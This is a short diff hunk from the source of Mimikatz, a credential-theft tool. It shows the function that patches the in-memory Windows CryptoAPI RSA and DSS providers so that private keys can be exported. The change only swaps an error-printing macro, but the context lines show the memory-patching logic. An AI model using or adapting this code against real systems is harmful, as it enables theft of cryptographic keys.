@@ -81,9 +81,9 @@ NTSTATUS kuhl_m_crypto_p_capi(int argc, wchar_t * argv[])
 			if(	kull_m_patch(&sMemoryRSA, &aPattern4001Memory, currentReference4001->Search.Length, &aPatch4001Memory, currentReference4001->Patch.Length, currentReference4001->Offsets.off0, NULL, 0, NULL, NULL) &&
 				kull_m_patch(&sMemoryRSA, &aPattern4000Memory, currentReference4000->Search.Length, &aPatch4000Memory, currentReference4000->Patch.Length, currentReference4000->Offsets.off0, NULL, 0, NULL, NULL))
 				kprintf(L"Local CryptoAPI RSA CSP patched\n");
-			else PRINT_ERROR_AUTO(L"kull_m_patch(RSA)");
+			else PRINT_ERROR_AUTO_C("kull_m_patch(RSA)");
 		}
-		else PRINT_ERROR_AUTO(L"kull_m_process_getVeryBasicModuleInformationsForName(RSA)");
+		else PRINT_ERROR_AUTO_C("kull_m_process_getVeryBasicModuleInformationsForName(RSA)");
 	}
 	currentReference104 = kull_m_patch_getGenericFromBuild(CapiDSS104References, ARRAYSIZE(CapiDSS104References), MIMIKATZ_NT_BUILD_NUMBER);
 	if(currentReference104)
@@ -96,9 +96,9 @@ NTSTATUS kuhl_m_crypto_p_capi(int argc, wchar_t * argv[])
 			sMemoryDSS.kull_m_memoryRange.size = iModule.SizeOfImage - ((PBYTE) K_DSS_CPExportKey - (PBYTE) iModule.DllBase.address);
 			if(kull_m_patch(&sMemoryDSS, &aPattern104Memory, currentReference104->Search.Length, &aPatch104Memory, currentReference104->Patch.Length, currentReference104->Offsets.off0, NULL, 0, NULL, NULL))
 				kprintf(L"Local CryptoAPI DSS CSP patched\n");
-			else PRINT_ERROR_AUTO(L"kull_m_patch(DSS)");
+			else PRINT_ERROR_AUTO_C("kull_m_patch(DSS)");
 		}
-		else PRINT_ERROR_AUTO(L"kull_m_process_getVeryBasicModuleInformationsForName(RSA)");
+		else PRINT_ERROR_AUTO_C("kull_m_process_getVeryBasicModuleInformationsForName(RSA)");
 	}
 	return STATUS_SUCCESS;
 }
